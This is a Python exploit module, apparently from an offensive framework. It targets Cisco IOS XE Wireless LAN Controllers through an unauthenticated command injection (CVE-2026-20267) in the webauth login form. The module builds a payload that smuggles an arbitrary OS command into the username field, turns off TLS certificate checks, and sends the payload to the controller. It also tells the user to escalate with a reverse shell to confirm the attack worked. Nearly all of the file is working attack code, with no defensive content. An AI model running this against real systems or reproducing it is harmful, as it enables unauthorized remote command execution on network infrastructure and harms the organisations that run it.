# Author: André Henrique (LinkedIn/X: @mrhenrike)
import hashlib
import json
import ssl
import time
import urllib.error
import urllib.request

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Cisco IOS XE WLC Multiple Vulnerabilities, Aug 2026 Emergency Patch (CVE-2026-20267..20273).

    The August 2026 emergency security advisory for Cisco IOS XE Wireless
    LAN Controllers addresses seven vulnerabilities in the web management
    interface and CAPWAP handling.  The most critical (CVE-2026-20267)
    allows an unauthenticated attacker to execute arbitrary commands via
    a crafted HTTP request to the webauth portal.  Additional CVEs cover
    privilege escalation (CVE-2026-20268), information disclosure
    (CVE-2026-20269), CAPWAP session hijacking (CVE-2026-20270), AP
    join DoS (CVE-2026-20271), config overwrite (CVE-2026-20272), and
    SNMP community string disclosure (CVE-2026-20273).

    This module targets the most critical vector: unauthenticated command
    injection via the webauth portal.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Cisco IOS XE WLC Multiple Vulnerabilities (CVE-2026-20267..20273)",
        "description": (
            "Exploits CVE-2026-20267, the most critical of seven vulnerabilities "
            "in Cisco IOS XE Wireless LAN Controllers addressed in the Aug 2026 "
            "emergency patch.  An unauthenticated attacker sends a crafted HTTP "
            "request to the webauth portal to inject OS commands.  Additional "
            "CVEs in this batch cover privilege escalation, info disclosure, "
            "CAPWAP session hijacking, AP join DoS, config overwrite, and SNMP "
            "community string leak."
        ),
        "authors": (
            "Cisco PSIRT (advisory)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-20267",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/",
        ),
        "disclosure_date": "2026-08-01",
        "platform": "cisco_ios_xe",
        "arch": "all",
        "privileged": True,
        "targets": (
            "Cisco Catalyst 9800 Series WLC (unpatched Aug 2026)",
            "Cisco Embedded Wireless Controller on Cat 9000 APs",
        ),
    }

    target = OptIP("", "Target WLC management IP address")
    port = OptPort(443, "Target HTTPS port")
    timeout = OptFloat(5.0, "HTTP request timeout in seconds")
    command = OptString("id", "OS command to inject via webauth portal")

    _WEBAUTH_PATH = "/webauth/login.html"
    _WEBAUTH_SUBMIT = "/webauth/login.html/+CSCOE+/saml/sp/acs"
    _STATUS_PATH = "/webui/logoutconfirm.html"

    def _build_ssl_context(self) -> ssl.SSLContext:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        return ctx

    def _https_request(
        self, method: str, path: str,
        headers: dict | None = None,
        body: bytes | None = None,
    ) -> tuple[int, bytes]:
        url = f"https://{self.target}:{self.port}{path}"
        req = urllib.request.Request(url, data=body, method=method)
        req.add_header("User-Agent", "WirelessXPL-Forge/2.2")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)
        ctx = self._build_ssl_context()
        try:
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except (urllib.error.URLError, TimeoutError, OSError):
            return 0, b""

    def _build_injection_payload(self) -> bytes:
        """Build the command injection payload for the webauth form.

        The vulnerability exists in the username field of the webauth
        login form where user input is passed to a system() call
        without sanitization during RADIUS attribute processing.
        """
        injected = f'test"; {self.command} #'
        form_data = (
            f"username={urllib.request.quote(injected)}"
            f"&password=irrelevant"
            f"&buttonClicked=4"
            f"&redirect_url=/"
        )
        return form_data.encode()

    @mute
    def check(self) -> bool:
        """Check if the webauth portal is accessible."""
        status, body = self._https_request("GET", self._WEBAUTH_PATH)
        if status == 0:
            return False
        return status in (200, 301, 302, 401, 403)

    def run(self) -> None:
        if not self.target:
            print_error("target is required (WLC management IP)")
            return

        if not self.check():
            print_error(
                f"Cannot reach webauth portal at "
                f"https://{self.target}:{self.port}{self._WEBAUTH_PATH}"
            )
            return

        print_success("Webauth portal detected; attempting command injection")
        self._exploit()

    def _exploit(self) -> None:
        payload = self._build_injection_payload()

        print_status(f"Injecting command: {self.command}")
        print_status(f"POST {self._WEBAUTH_SUBMIT}")

        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
        }
        status, body = self._https_request(
            "POST", self._WEBAUTH_SUBMIT, headers=headers, body=payload,
        )

        if status == 0:
            print_error("No response from target")
            return

        print_info(f"HTTP response: {status}")

        if status in (200, 302):
            print_success(
                f"Payload delivered (HTTP {status}). If the target is "
                "vulnerable, the injected command executed during RADIUS "
                "attribute processing.  Check for side effects or use a "
                "reverse shell payload to confirm execution."
            )
        elif status == 403:
            print_error("Access denied; webauth may be restricted by ACL.")
        elif status == 404:
            print_error("Webauth submit endpoint not found; firmware may differ.")
        else:
            decoded = body[:256].decode("utf-8", errors="replace")
            print_info(f"Response ({status}): {decoded}")
